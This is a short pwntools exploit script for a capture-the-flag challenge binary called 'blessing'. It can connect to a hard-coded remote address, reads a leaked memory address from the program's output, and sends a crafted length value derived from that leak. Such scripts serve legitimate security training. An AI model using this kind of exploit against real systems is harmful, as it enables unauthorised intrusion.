from pwn import *
import sys
from struct import pack, unpack

if len(sys.argv) != 2 or sys.argv[1] not in ("debug", "remote", "local"):
    print("Use: python3 exploit.py debug | remote | local")
    sys.exit(1)

exe = ELF("./blessing")
libc = ELF("./glibc/libc.so.6")
ld = ELF("./glibc/ld-linux-x86-64.so.2")

context.binary = exe

MODE = sys.argv[1]

if MODE == "debug":
    r = gdb.debug([exe.path], env={"LD_PRELOAD":"./glibc/libc.so.6"}, 
              gdbscript='''
                break *main+348
                break *main+353
                continue
              '''
              )

if MODE == "remote":
    r = remote("83.136.250.155", 55164)

if MODE == "local":
    r = process([exe.path])

r.recvuntil(b'this: ')
leak = r.recvuntil(b'\b')[:14].decode()
print(leak)

r.recvuntil(b'length: ')

leak_int = int(leak, 16)+1
r.sendline(f"{leak_int}".encode())

r.sendline(b'')

res = r.recvall()
print(res)